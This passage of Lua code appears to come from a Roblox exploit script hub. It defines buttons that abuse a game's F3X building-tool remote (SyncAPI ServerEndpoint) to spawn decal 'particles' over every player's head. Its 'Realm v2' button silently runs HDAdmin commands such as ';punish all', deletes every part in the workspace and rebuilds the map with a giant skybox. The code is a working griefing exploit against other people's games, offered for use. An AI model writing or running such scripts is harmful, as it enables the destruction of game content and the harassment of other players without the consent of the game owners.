        [2] = {  
            [1] = {  
                ["Part"] = part,  
                ["Anchored"] = boolean  
            }  
        }  
    }  
    _(args)  
end  

function CreatePart(cf, parent)  
    local args = {  
        [1] = "CreatePart",  
        [2] = "Normal",  
        [3] = cf,  
        [4] = parent  
    }  
    _(args)  
end  

function Resize(part, size, cf)  
    local args = {  
        [1] = "SyncResize",  
        [2] = {  
            [1] = {  
                ["Part"] = part,  
                ["CFrame"] = cf,  
                ["Size"] = size  
            }  
        }  
    }  
    _(args)  
end  

function AddDecal(part, asset, side)  
    local args = {  
        [1] = "SyncTexture",  
        [2] = {  
            [1] = {  
                ["Part"] = part,  
                ["Face"] = side,  
                ["TextureType"] = "Decal",  
                ["Texture"] = "rbxassetid://" .. asset  
            }  
        }  
    }  
    _(args)  
end  

function SpawnDecal(part, side)  
    local args = {  
        [1] = "CreateTextures",  
        [2] = {  
            [1] = {  
                ["Part"] = part,  
                ["Face"] = side,  
                ["TextureType"] = "Decal"  
            }  
        }  
    }  
    _(args)  
end  

function SetName(part, stringg)  
    local args = {  
        [1] = "SetName",  
        [2] = {  
            [1] = workspace.Part  
        },  
        [3] = stringg  
    }  
    _(args)  
end  

function SetTrans(part, int)  
    local args = {  
        [1] = "SyncMaterial",  
        [2] = {  
            [1] = {  
                ["Part"] = part,  
                ["Transparency"] = int  
            }  
        }  
    }  
    _(args)  
end  

local function delete(part)  
    local args = {  
        [1] = "Remove",  
        [2] = {  
            [1] = part  
        }  
    }  
    remote:InvokeServer(unpack(args))  
end  

local function particleEffect(textureId)
    while true do
        task.wait(0.1)
        if player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.Health > 0 then
            local hrp = player.Character:FindFirstChild("HumanoidRootPart")
            if not hrp then continue end

            local x = hrp.Position.X + math.random(-60, 60)
            local z = hrp.Position.Z + math.random(-60, 60)
            local y = hrp.Position.Y - 50
            local spawnPosition = CFrame.new(x, y, z)

            task.spawn(function()
                CreatePart(spawnPosition, workspace)
                task.wait(0.1)

                for _, v in workspace:GetChildren() do
                    if v:IsA("Part") and (v.Position - Vector3.new(x, y, z)).Magnitude < 1 then
                        local part = v
                        SetName(part, "particle")
                        Resize(part, Vector3.new(6, 6, 0.001), part.CFrame)
                        SetCollision(part, false)
                        SetTrans(part, 1)
                        SetAnchor(true, part)
                        part.Orientation = Vector3.new(0, 0, 0)

                        SpawnDecal(part, Enum.NormalId.Front)
                        AddDecal(part, textureId, Enum.NormalId.Front)
                        SpawnDecal(part, Enum.NormalId.Back)
                        AddDecal(part, textureId, Enum.NormalId.Back)

                        local up = 90
                        for i = 2, up do
                            if part and part.Parent then
                                local newCF = part.CFrame + Vector3.new(0, 2, 0)
                                Resize(part, part.Size, newCF)
                                task.wait(0.01)
                            end
                        end

                        delete(part)
                        break
                    end
                end
            end)
        else
            task.wait(1)
        end
    end
end

local textures = {
    "12667521510",
    "12585611688",
    "76658875202103",
}

for _, texId in ipairs(textures) do
    coroutine.wrap(function()
        particleEffect(texId)
    end)()
end
    end
})
AddButton({
    Name = "k00p particles",
    Callback = function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local tool
for _, v in player:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
        break
    end
end
if not tool then
    for _, v in game.ReplicatedStorage:GetDescendants() do
        if v.Name == "SyncAPI" then
            tool = v.Parent
            break
        end
    end
end
if not tool then
    error("SyncAPI tool not found skid")
end

local remote = tool.SyncAPI.ServerEndpoint
local function _(args)
    remote:InvokeServer(unpack(args))
end
local function CreatePart(cf, parent)
    _({"CreatePart", "Normal", cf, parent})
end
local function SetAnchor(part, state)
    _({"SyncAnchor", {{Part = part, Anchored = state}}})
end
local function SetCollision(part, state)
    _({"SyncCollision", {{Part = part, CanCollide = state}}})
end
local function AddMesh(part)
    _({"CreateMeshes", {{Part = part}}})
end
local function SetMesh(part, meshid)
    _({"SyncMesh", {{Part = part, MeshId = "rbxassetid://" .. meshid}}})
end
local function SetTexture(part, texid)
    _({"SyncMesh", {{Part = part, TextureId = "rbxassetid://" .. texid}}})
end
local function MeshResize(part, size)
    _({"SyncMesh", {{Part = part, Scale = size}}})
end
local function SetLocked(part, state)
    _({"SetLocked", {part}, state})
end
local function Resize(part, size, cf)
    _({"SyncResize", {{Part = part, CFrame = cf, Size = size}}})
end
local function SpawnDecal(part, face)
    _({"CreateTextures", {{Part = part, Face = face, TextureType = "Decal"}}})
end
local function AddDecal(part, asset, face)
    _({"SyncTexture", {{Part = part, Face = face, TextureType = "Decal", Texture = "rbxassetid://"..asset}}})
end
local function SetName(part, name)
    _({"SetName", {part}, name})
end
local function SetTrans(part, val)
    _({"SyncMaterial", {{Part = part, Transparency = val}}})
end
local function delete(part)
    _({"Remove", {part}})
end
local activeParticles = {}
local particleCooldowns = {}

local function createParticleForPlayer(targetPlayer, textureId)
    -- Wait for character to load
    local character = targetPlayer.Character
    if not character then
        targetPlayer.CharacterAdded:Wait()
        character = targetPlayer.Character
    end
    
    local humanoid = character:WaitForChild("Humanoid")
    local playerKey = targetPlayer.UserId
    local cooldownKey = playerKey .. "_" .. textureId
    particleCooldowns[cooldownKey] = particleCooldowns[cooldownKey] or 0
    
    while true do
        local currentTime = tick()
        if currentTime - particleCooldowns[cooldownKey] >= 2 then
            particleCooldowns[cooldownKey] = currentTime
            
            -- Check if player and character are still valid
            if not targetPlayer or not targetPlayer.Parent or not character or not character.Parent or humanoid.Health <= 0 then
                break
            end
            
            local head = character:FindFirstChild("Head")
            if not head then
                task.wait(1)
                continue
            end
            local spawnCFrame = head.CFrame + Vector3.new(0, 3, 0)
            
            task.spawn(function()  
                CreatePart(spawnCFrame, workspace)  
                task.wait(0.1)  
                
                local newPart = nil
                for _, v in workspace:GetChildren() do  
                    if v:IsA("Part") and (v.Position - spawnCFrame.Position).Magnitude < 1 then  
                        newPart = v
                        break
                    end  
                end
                
                if newPart then
                    SetName(newPart, "particle_" .. targetPlayer.Name .. "_" .. textureId)  
                    Resize(newPart, Vector3.new(6, 6, 0.001), newPart.CFrame)  
                    SetCollision(newPart, false)  
                    SetTrans(newPart, 1)  
                    SetAnchor(newPart, true)  
                    newPart.Orientation = Vector3.new(0, 0, 0)  

                    SpawnDecal(newPart, Enum.NormalId.Front)  
                    AddDecal(newPart, textureId, Enum.NormalId.Front)  
                    SpawnDecal(newPart, Enum.NormalId.Back)  
                    AddDecal(newPart, textureId, Enum.NormalId.Back)  

                    -- Track this particle
                    local particleId = #activeParticles + 1
                    activeParticles[particleId] = newPart

                    -- Animate particle rising up
                    for i = 1, 40 do  -- Reduced frames for faster cleanup
                        if newPart and newPart.Parent and head and head.Parent then  
                            local currentHeadPos = head.Position
                            local newPosition = Vector3.new(
                                currentHeadPos.X,
                                spawnCFrame.Position.Y + (i * 2),  -- Move up 2 studs per frame
                                currentHeadPos.Z
                            )
                            local newCFrame = CFrame.new(newPosition)
                            Resize(newPart, newPart.Size, newCFrame)  
                            task.wait(0.05)  -- Slightly faster animation
                        else
                            break
                        end
                    end  
                    
                    -- Cleanup
                    if newPart and newPart.Parent then
                        delete(newPart)  
                    end
                    activeParticles[particleId] = nil
                end  
            end)  
        end
        
        task.wait(0.5) -- Check every 0.5 seconds instead of 0.1
    end
end

--// === Manage Particles for All Players ===
local function startParticleSystem()
    local textureIds = {"90174292761643"}
    local activeConnections = {}
    
    -- Function to start particles for a specific player
    local function startForPlayer(player)
        for _, texId in ipairs(textureIds) do
            coroutine.wrap(function()
                createParticleForPlayer(player, texId)
            end)()
        end
    end
    
    -- Function to stop particles for a specific player
    local function stopForPlayer(player)
        -- Clean up any particles for this player
        for particleId, part in pairs(activeParticles) do
            if part.Name:find(player.Name) and part.Parent then
                delete(part)
                activeParticles[particleId] = nil
            end
        end
    end
    
    -- Start particles for all current players
    for _, existingPlayer in ipairs(Players:GetPlayers()) do
        startForPlayer(existingPlayer)
    end
    
    -- Listen for new players
    Players.PlayerAdded:Connect(function(newPlayer)
        startForPlayer(newPlayer)
    end)
    
    -- Listen for players leaving
    Players.PlayerRemoving:Connect(function(leavingPlayer)
        stopForPlayer(leavingPlayer)
    end)
end

--// === Cleanup System ===
local function setupCleanup()
    -- Periodic cleanup of any orphaned particles
    while true do
        task.wait(10) -- Clean up every 10 seconds
        for particleId, part in pairs(activeParticles) do
            if not part or not part.Parent then
                activeParticles[particleId] = nil
            end
        end
    end
end

--// === Run Particle System ===
startParticleSystem()
coroutine.wrap(setupCleanup)()
    end 
})
AddButton({
    Name = "c00lkidd Particles",
    Callback = function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

--// SyncAPI Setup
local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local tool

-- Try to find SyncAPI in player first
for _, v in player:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
        break
    end
end
-- If not found, check ReplicatedStorage
if not tool then
    for _, v in game.ReplicatedStorage:GetDescendants() do
        if v.Name == "SyncAPI" then
            tool = v.Parent
            break
        end
    end
end
if not tool then
    error("SyncAPI tool not found")
end

local remote = tool.SyncAPI.ServerEndpoint

--// Simple remote call wrapper
local function _(args)
    remote:InvokeServer(unpack(args))
end

--// Helper functions
local function CreatePart(cf, parent)
    _({"CreatePart", "Normal", cf, parent})
end
local function SetAnchor(part, state)
    _({"SyncAnchor", {{Part = part, Anchored = state}}})
end
local function SetCollision(part, state)
    _({"SyncCollision", {{Part = part, CanCollide = state}}})
end
local function AddMesh(part)
    _({"CreateMeshes", {{Part = part}}})
end
local function SetMesh(part, meshid)
    _({"SyncMesh", {{Part = part, MeshId = "rbxassetid://" .. meshid}}})
end
local function SetTexture(part, texid)
    _({"SyncMesh", {{Part = part, TextureId = "rbxassetid://" .. texid}}})
end
local function MeshResize(part, size)
    _({"SyncMesh", {{Part = part, Scale = size}}})
end
local function SetLocked(part, state)
    _({"SetLocked", {part}, state})
end
local function Resize(part, size, cf)
    _({"SyncResize", {{Part = part, CFrame = cf, Size = size}}})
end
local function SpawnDecal(part, face)
    _({"CreateTextures", {{Part = part, Face = face, TextureType = "Decal"}}})
end
local function AddDecal(part, asset, face)
    _({"SyncTexture", {{Part = part, Face = face, TextureType = "Decal", Texture = "rbxassetid://"..asset}}})
end
local function SetName(part, name)
    _({"SetName", {part}, name})
end
local function SetTrans(part, val)
    _({"SyncMaterial", {{Part = part, Transparency = val}}})
end
local function delete(part)
    _({"Remove", {part}})
end

--// === Improved Particle Effect System ===
local activeParticles = {}
local particleCooldowns = {}

local function createParticleForPlayer(targetPlayer, textureId)
    -- Wait for character to load
    local character = targetPlayer.Character
    if not character then
        targetPlayer.CharacterAdded:Wait()
        character = targetPlayer.Character
    end
    
    local humanoid = character:WaitForChild("Humanoid")
    local playerKey = targetPlayer.UserId
    
    -- Initialize cooldown for this player/texture combination
    local cooldownKey = playerKey .. "_" .. textureId
    particleCooldowns[cooldownKey] = particleCooldowns[cooldownKey] or 0
    
    while true do
        local currentTime = tick()
        
        -- Check cooldown (2 seconds between particles)
        if currentTime - particleCooldowns[cooldownKey] >= 2 then
            particleCooldowns[cooldownKey] = currentTime
            
            -- Check if player and character are still valid
            if not targetPlayer or not targetPlayer.Parent or not character or not character.Parent or humanoid.Health <= 0 then
                break
            end
            
            local head = character:FindFirstChild("Head")
            if not head then
                task.wait(1)
                continue
            end

            -- Spawn particle above head
            local spawnCFrame = head.CFrame + Vector3.new(0, 3, 0)
            
            task.spawn(function()  
                CreatePart(spawnCFrame, workspace)  
                task.wait(0.1)  
                
                local newPart = nil
                for _, v in workspace:GetChildren() do  
                    if v:IsA("Part") and (v.Position - spawnCFrame.Position).Magnitude < 1 then  
                        newPart = v
                        break
                    end  
                end
                
                if newPart then
                    SetName(newPart, "particle_" .. targetPlayer.Name .. "_" .. textureId)  
                    Resize(newPart, Vector3.new(6, 6, 0.001), newPart.CFrame)  
                    SetCollision(newPart, false)  
                    SetTrans(newPart, 1)  
                    SetAnchor(newPart, true)  
                    newPart.Orientation = Vector3.new(0, 0, 0)  

                    SpawnDecal(newPart, Enum.NormalId.Front)  
                    AddDecal(newPart, textureId, Enum.NormalId.Front)  
                    SpawnDecal(newPart, Enum.NormalId.Back)  
                    AddDecal(newPart, textureId, Enum.NormalId.Back)  

                    -- Track this particle
                    local particleId = #activeParticles + 1
                    activeParticles[particleId] = newPart

                    -- Animate particle rising up
                    for i = 1, 40 do  -- Reduced frames for faster cleanup
                        if newPart and newPart.Parent and head and head.Parent then  
                            local currentHeadPos = head.Position
                            local newPosition = Vector3.new(
                                currentHeadPos.X,
                                spawnCFrame.Position.Y + (i * 2),  -- Move up 2 studs per frame
                                currentHeadPos.Z
                            )
                            local newCFrame = CFrame.new(newPosition)
                            Resize(newPart, newPart.Size, newCFrame)  
                            task.wait(0.05)  -- Slightly faster animation
                        else
                            break
                        end
                    end  
                    
                    -- Cleanup
                    if newPart and newPart.Parent then
                        delete(newPart)  
                    end
                    activeParticles[particleId] = nil
                end  
            end)  
        end
        
        task.wait(0.5) -- Check every 0.5 seconds instead of 0.1
    end
end

--// === Manage Particles for All Players ===
local function startParticleSystem()
    local textureIds = {"158118263"}
    local activeConnections = {}
    
    -- Function to start particles for a specific player
    local function startForPlayer(player)
        for _, texId in ipairs(textureIds) do
            coroutine.wrap(function()
                createParticleForPlayer(player, texId)
            end)()
        end
    end
    
    -- Function to stop particles for a specific player
    local function stopForPlayer(player)
        -- Clean up any particles for this player
        for particleId, part in pairs(activeParticles) do
            if part.Name:find(player.Name) and part.Parent then
                delete(part)
                activeParticles[particleId] = nil
            end
        end
    end
    
    -- Start particles for all current players
    for _, existingPlayer in ipairs(Players:GetPlayers()) do
        startForPlayer(existingPlayer)
    end
    
    -- Listen for new players
    Players.PlayerAdded:Connect(function(newPlayer)
        startForPlayer(newPlayer)
    end)
    
    -- Listen for players leaving
    Players.PlayerRemoving:Connect(function(leavingPlayer)
        stopForPlayer(leavingPlayer)
    end)
end

--// === Cleanup System ===
local function setupCleanup()
    -- Periodic cleanup of any orphaned particles
    while true do
        task.wait(10) -- Clean up every 10 seconds
        for particleId, part in pairs(activeParticles) do
            if not part or not part.Parent then
                activeParticles[particleId] = nil
            end
        end
    end
end

--// === Run Particle System ===
startParticleSystem()
coroutine.wrap(setupCleanup)()
    end 
})
AddButton({
    Name = "Mario.exe particles",
    Callback = function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

--// SyncAPI Setup
local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local tool

-- Try to find SyncAPI in player first
for _, v in player:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
        break
    end
end
-- If not found, check ReplicatedStorage
if not tool then
    for _, v in game.ReplicatedStorage:GetDescendants() do
        if v.Name == "SyncAPI" then
            tool = v.Parent
            break
        end
    end
end
if not tool then
    error("SyncAPI tool not found")
end

local remote = tool.SyncAPI.ServerEndpoint

--// Simple remote call wrapper
local function _(args)
    remote:InvokeServer(unpack(args))
end

--// Helper functions
local function CreatePart(cf, parent)
    _({"CreatePart", "Normal", cf, parent})
end
local function SetAnchor(part, state)
    _({"SyncAnchor", {{Part = part, Anchored = state}}})
end
local function SetCollision(part, state)
    _({"SyncCollision", {{Part = part, CanCollide = state}}})
end
local function AddMesh(part)
    _({"CreateMeshes", {{Part = part}}})
end
local function SetMesh(part, meshid)
    _({"SyncMesh", {{Part = part, MeshId = "rbxassetid://" .. meshid}}})
end
local function SetTexture(part, texid)
    _({"SyncMesh", {{Part = part, TextureId = "rbxassetid://" .. texid}}})
end
local function MeshResize(part, size)
    _({"SyncMesh", {{Part = part, Scale = size}}})
end
local function SetLocked(part, state)
    _({"SetLocked", {part}, state})
end
local function Resize(part, size, cf)
    _({"SyncResize", {{Part = part, CFrame = cf, Size = size}}})
end
local function SpawnDecal(part, face)
    _({"CreateTextures", {{Part = part, Face = face, TextureType = "Decal"}}})
end
local function AddDecal(part, asset, face)
    _({"SyncTexture", {{Part = part, Face = face, TextureType = "Decal", Texture = "rbxassetid://"..asset}}})
end
local function SetName(part, name)
    _({"SetName", {part}, name})
end
local function SetTrans(part, val)
    _({"SyncMaterial", {{Part = part, Transparency = val}}})
end
local function delete(part)
    _({"Remove", {part}})
end

--// === Improved Particle Effect System ===
local activeParticles = {}
local particleCooldowns = {}

local function createParticleForPlayer(targetPlayer, textureId)
    -- Wait for character to load
    local character = targetPlayer.Character
    if not character then
        targetPlayer.CharacterAdded:Wait()
        character = targetPlayer.Character
    end
    
    local humanoid = character:WaitForChild("Humanoid")
    local playerKey = targetPlayer.UserId
    
    -- Initialize cooldown for this player/texture combination
    local cooldownKey = playerKey .. "_" .. textureId
    particleCooldowns[cooldownKey] = particleCooldowns[cooldownKey] or 0
    
    while true do
        local currentTime = tick()
        
        -- Check cooldown (2 seconds between particles)
        if currentTime - particleCooldowns[cooldownKey] >= 2 then
            particleCooldowns[cooldownKey] = currentTime
            
            -- Check if player and character are still valid
            if not targetPlayer or not targetPlayer.Parent or not character or not character.Parent or humanoid.Health <= 0 then
                break
            end
            
            local head = character:FindFirstChild("Head")
            if not head then
                task.wait(1)
                continue
            end

            -- Spawn particle above head
            local spawnCFrame = head.CFrame + Vector3.new(0, 3, 0)
            
            task.spawn(function()  
                CreatePart(spawnCFrame, workspace)  
                task.wait(0.1)  
                
                local newPart = nil
                for _, v in workspace:GetChildren() do  
                    if v:IsA("Part") and (v.Position - spawnCFrame.Position).Magnitude < 1 then  
                        newPart = v
                        break
                    end  
                end
                
                if newPart then
                    SetName(newPart, "particle_" .. targetPlayer.Name .. "_" .. textureId)  
                    Resize(newPart, Vector3.new(6, 6, 0.001), newPart.CFrame)  
                    SetCollision(newPart, false)  
                    SetTrans(newPart, 1)  
                    SetAnchor(newPart, true)  
                    newPart.Orientation = Vector3.new(0, 0, 0)  

                    SpawnDecal(newPart, Enum.NormalId.Front)  
                    AddDecal(newPart, textureId, Enum.NormalId.Front)  
                    SpawnDecal(newPart, Enum.NormalId.Back)  
                    AddDecal(newPart, textureId, Enum.NormalId.Back)  

                    -- Track this particle
                    local particleId = #activeParticles + 1
                    activeParticles[particleId] = newPart

                    -- Animate particle rising up
                    for i = 1, 40 do  -- Reduced frames for faster cleanup
                        if newPart and newPart.Parent and head and head.Parent then  
                            local currentHeadPos = head.Position
                            local newPosition = Vector3.new(
                                currentHeadPos.X,
                                spawnCFrame.Position.Y + (i * 2),  -- Move up 2 studs per frame
                                currentHeadPos.Z
                            )
                            local newCFrame = CFrame.new(newPosition)
                            Resize(newPart, newPart.Size, newCFrame)  
                            task.wait(0.05)  -- Slightly faster animation
                        else
                            break
                        end
                    end  
                    
                    -- Cleanup
                    if newPart and newPart.Parent then
                        delete(newPart)  
                    end
                    activeParticles[particleId] = nil
                end  
            end)  
        end
        
        task.wait(0.5) -- Check every 0.5 seconds instead of 0.1
    end
end

--// === Manage Particles for All Players ===
local function startParticleSystem()
    local textureIds = {"12851404448"}
    local activeConnections = {}
    
    -- Function to start particles for a specific player
    local function startForPlayer(player)
        for _, texId in ipairs(textureIds) do
            coroutine.wrap(function()
                createParticleForPlayer(player, texId)
            end)()
        end
    end
    
    -- Function to stop particles for a specific player
    local function stopForPlayer(player)
        -- Clean up any particles for this player
        for particleId, part in pairs(activeParticles) do
            if part.Name:find(player.Name) and part.Parent then
                delete(part)
                activeParticles[particleId] = nil
            end
        end
    end
    
    -- Start particles for all current players
    for _, existingPlayer in ipairs(Players:GetPlayers()) do
        startForPlayer(existingPlayer)
    end
    
    -- Listen for new players
    Players.PlayerAdded:Connect(function(newPlayer)
        startForPlayer(newPlayer)
    end)
    
    -- Listen for players leaving
    Players.PlayerRemoving:Connect(function(leavingPlayer)
        stopForPlayer(leavingPlayer)
    end)
end

--// === Cleanup System ===
local function setupCleanup()
    -- Periodic cleanup of any orphaned particles
    while true do
        task.wait(10) -- Clean up every 10 seconds
        for particleId, part in pairs(activeParticles) do
            if not part or not part.Parent then
                activeParticles[particleId] = nil
            end
        end
    end
end

--// === Run Particle System ===
startParticleSystem()
coroutine.wrap(setupCleanup)()
end
})
AddButton({
    Name = "Realm v2",
    Callback = function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")

-- small convenience: call HDAdmin commands quietly
pcall(function()
    local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
    RequestCommand:InvokeServer(";btools me")
    RequestCommand:InvokeServer(";fogcolor black")
    wait(0.4)
    RequestCommand:InvokeServer(";punish all")
end)

local player = Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local backpack = player.Backpack

-- find F3X (SyncAPI)
local function getf3x()
    for _, v in ipairs(backpack:GetChildren()) do
        if v:FindFirstChild("SyncAPI") then return v end
    end
    for _, v in ipairs(char:GetChildren()) do
        if v:FindFirstChild("SyncAPI") then return v end
    end
    return nil
end

local f3x = getf3x()
if not f3x then warn("you don't have F3X") return end

local syncapi = f3x.SyncAPI
local serverendpoint = syncapi.ServerEndpoint

-- Helper: fast parallel invoke
local function fastInvoke(args)
    spawn(function()
        pcall(function()
            serverendpoint:InvokeServer(unpack(args))
        end)
    end)
end

-- Helpers for parts
local function delete(part)
    fastInvoke({"Remove",{part}})
end

local function resize(part, size, cf)
    fastInvoke({"SyncResize",{{["Part"]=part,["CFrame"]=cf,["Size"]=size}}})
end

local function syncmaterial(part, mate)
    fastInvoke({"SyncMaterial",{{["Part"]=part,["Material"]=mate}}})
end

local function transparency(part, trans)
    fastInvoke({"SyncMaterial",{{["Part"]=part,["Transparency"]=trans}}})
end

local function color(part, col)
    fastInvoke({"SyncColor",{{["Part"]=part,["Color"]=col,["UnionColoring"]=false}}})
end

local function name(part, str)
    fastInvoke({"SetName",{part}, str})
end

local function lock(part, bool)
    fastInvoke({"SetLocked",{part}, bool})
end

local function setcollision(part, bool)
    fastInvoke({"SyncCollision",{{["Part"]=part,["CanCollide"]=bool}}})
end

local function setanchor(part, bool)
    fastInvoke({"SyncAnchor",{{["Part"]=part,["Anchored"]=bool}}})
end

local function createdecal(part, face)
    fastInvoke({"CreateTextures",{{["Part"]=part,["Face"]=face,["TextureType"]="Decal"}}})
end

local function setdecal(part, asset, face)
    fastInvoke({"SyncTexture",{{["Part"]=part,["Face"]=face,["TextureType"]="Decal",["Texture"]="rbxassetid://"..asset}}})
end

-- === Fixed Skybox Function ===
local function GiantSky(id)
    local hrp = char:WaitForChild("HumanoidRootPart")
    local cf = hrp.CFrame
    local pos = cf.Position + Vector3.new(0, 6, 0)

    -- Create the skybox part with a unique name to identify it easily
    local skyboxName = "SkyboxPart_" .. tick()
    
    -- Use direct invoke for creation to get the part reference
    local success, result = pcall(function()
        return serverendpoint:InvokeServer("CreatePart", "Normal", CFrame.new(pos), workspace, skyboxName)
    end)
    
    if not success then
        -- Fallback to async method
        fastInvoke({"CreatePart", "Normal", CFrame.new(pos), workspace, skyboxName})
        wait(0.5)
    else
        -- If we got the part reference directly, use it
        if result and result:IsA("BasePart") then
            local skyboxPart = result
            setanchor(skyboxPart, true)
            fastInvoke({"CreateMeshes",{{Part = skyboxPart}}})
            fastInvoke({"SyncMesh",{{Part = skyboxPart, MeshId = "rbxassetid://111891702759441"}}})
            fastInvoke({"SyncMesh",{{Part = skyboxPart, TextureId = "rbxassetid://" .. id}}})
            fastInvoke({"SyncMesh",{{Part = skyboxPart, Scale = Vector3.new(90000, 90000, 90000)}}})
            setcollision(skyboxPart, false)
            lock(skyboxPart, true)
            name(skyboxPart, "GiantSkybox")
            return
        end
    end
    
    -- Search for the created part with retry logic
    local skyboxPart = nil
    local attempts = 0
    while not skyboxPart and attempts < 10 do
        for _, v in workspace:GetDescendants() do
            if v:IsA("BasePart") and (v.Name == skyboxName or (v.Position - pos).Magnitude < 5) then
                skyboxPart = v
                break
            end
        end
        if not skyboxPart then
            wait(0.1)
            attempts = attempts + 1
        end
    end
    
    if skyboxPart then
        setanchor(skyboxPart, true)
        fastInvoke({"CreateMeshes",{{Part = skyboxPart}}})
        fastInvoke({"SyncMesh",{{Part = skyboxPart, MeshId = "rbxassetid://111891702759441"}}})
        fastInvoke({"SyncMesh",{{Part = skyboxPart, TextureId = "rbxassetid://" .. id}}})
        fastInvoke({"SyncMesh",{{Part = skyboxPart, Scale = Vector3.new(90000, 90000, 90000)}}})
        setcollision(skyboxPart, false)
        lock(skyboxPart, true)
        name(skyboxPart, "GiantSkybox")
    else
        warn("Skybox part not found after creation attempts")
    end
end

-- Delete all existing parts
for _, v in ipairs(workspace:GetDescendants()) do
    if v:IsA("BasePart") or v:IsA("UnionOperation") then
        spawn(function()
            pcall(function() delete(v) end)
        end)
    end
end

wait(0.8) -- Increased delay to ensure cleanup completes

-- Create skybox first
GiantSky("99706029040118")

wait(0.5) -- Wait for skybox to be created

-- ROOM PARAMETERS
local ROOM_SIZE = Vector3.new(60,20,40)
local WALL_THICKNESS = 2
local FLOOR_THICKNESS = 2
local ROOM_Y = 5
local ROOM_CENTER = CFrame.new(0, ROOM_Y, 0)

-- Fast create function
local function createFastPart(partType, cf, size, material, col, nameStr, anchored, collide, extra)
    spawn(function()
        local part = serverendpoint:InvokeServer("CreatePart", partType, cf, workspace)
        if part then
            resize(part, size, cf)
            syncmaterial(part, material)
            color(part, col)
            name(part, nameStr)
            lock(part, true)
            setanchor(part, anchored)
            setcollision(part, collide)
            if extra then extra(part) end
        end
    end)
end

-- FLOOR
createFastPart("Normal",
    ROOM_CENTER * CFrame.new(0, - (ROOM_SIZE.Y/2) + (FLOOR_THICKNESS/2), 0),
    Vector3.new(ROOM_SIZE.X, FLOOR_THICKNESS, ROOM_SIZE.Z),
    Enum.Material.Concrete,
    Color3.fromRGB(150,150,150),
    "RoomFloor",
    true,
    true
)

-- CEILING
createFastPart("Normal",
    ROOM_CENTER * CFrame.new(0,(ROOM_SIZE.Y/2) - (FLOOR_THICKNESS/2),0),
    Vector3.new(ROOM_SIZE.X,FLOOR_THICKNESS,ROOM_SIZE.Z),
    Enum.Material.SmoothPlastic,
    Color3.fromRGB(230,230,230),
    "RoomRoof",
    true,
    true
)

-- WALLS
local halfX = ROOM_SIZE.X / 2
local halfZ = ROOM_SIZE.Z / 2
local wallHeight = ROOM_SIZE.Y - (FLOOR_THICKNESS*2)

-- Back wall
createFastPart("Normal",
    ROOM_CENTER * CFrame.new(0,0,halfZ-(WALL_THICKNESS/2)),
    Vector3.new(ROOM_SIZE.X,wallHeight,WALL_THICKNESS),
    Enum.Material.Brick,
    Color3.fromRGB(200,200,200),
    "BackWall",
    true,
    true
)

-- Front wall with door
local doorWidth = 8
local sideWallWidth = (ROOM_SIZE.X - doorWidth)/2

createFastPart("Normal",
    ROOM_CENTER * CFrame.new(- (doorWidth/2) - (sideWallWidth/2), 0, -halfZ + (WALL_THICKNESS/2)),
    Vector3.new(sideWallWidth, wallHeight, WALL_THICKNESS),
    Enum.Material.Brick,
    Color3.fromRGB(200,200,200),
    "FrontWallLeft",
    true,
    true
)

createFastPart("Normal",
    ROOM_CENTER * CFrame.new((doorWidth/2) + (sideWallWidth/2), 0, -halfZ + (WALL_THICKNESS/2)),
    Vector3.new(sideWallWidth, wallHeight, WALL_THICKNESS),
    Enum.Material.Brick,
    Color3.fromRGB(200,200,200),
    "FrontWallRight",
    true,
    true
)

-- Left wall
createFastPart("Normal",
    ROOM_CENTER * CFrame.new(-halfX + (WALL_THICKNESS/2),0,0),
    Vector3.new(WALL_THICKNESS, wallHeight, ROOM_SIZE.Z),
    Enum.Material.Brick,
    Color3.fromRGB(200,200,200),
    "LeftWall",
    true,
    true
)

-- Right wall
createFastPart("Normal",
    ROOM_CENTER * CFrame.new(halfX - (WALL_THICKNESS/2),0,0),
    Vector3.new(WALL_THICKNESS, wallHeight, ROOM_SIZE.Z),
    Enum.Material.Brick,
    Color3.fromRGB(200,200,200),
    "RightWall",
    true,
    true
)

-- Poster on right interior wall
local posterId = "83022346908747"
local posterHeight = 10
local posterWidth = 8
local posterThickness = 0.2
local posterX = halfX - WALL_THICKNESS - (posterThickness/2)

createFastPart("Normal",
    CFrame.new(posterX, ROOM_CENTER.Y, 0),
    Vector3.new(posterThickness, posterHeight, posterWidth),
    Enum.Material.SmoothPlastic,
    Color3.fromRGB(255,255,255),
    "RulesPoster_RightWall",
    true,
    false,
    function(part)
        createdecal(part, Enum.NormalId.Left)
        setdecal(part, posterId, Enum.NormalId.Left)
    end
)

-- Fountain
local fountainCenterCF = ROOM_CENTER * CFrame.new(0, - (ROOM_SIZE.Y/2) + FLOOR_THICKNESS + 1.5, 0)

-- Basin
createFastPart("Normal", fountainCenterCF, Vector3.new(14,2,14), Enum.Material.Slate, Color3.fromRGB(120,120,120), "FountainBasin", true, true)
createFastPart("Normal", fountainCenterCF * CFrame.new(0,1.1,0), Vector3.new(12.5,0.6,12.5), Enum.Material.SmoothPlastic, Color3.fromRGB(100,100,100), "BasinInnerRim", true, true)
-- Pillar & top plate
createFastPart("Normal", fountainCenterCF * CFrame.new(0,3.5,0), Vector3.new(2,7,2), Enum.Material.Slate, Color3.fromRGB(140,140,140), "FountainPillar", true, true)
createFastPart("Normal", fountainCenterCF * CFrame.new(0,7.7,0), Vector3.new(6,0.6,6), Enum.Material.SmoothPlastic, Color3.fromRGB(160,160,160), "TopPlate", true, true)
-- Water
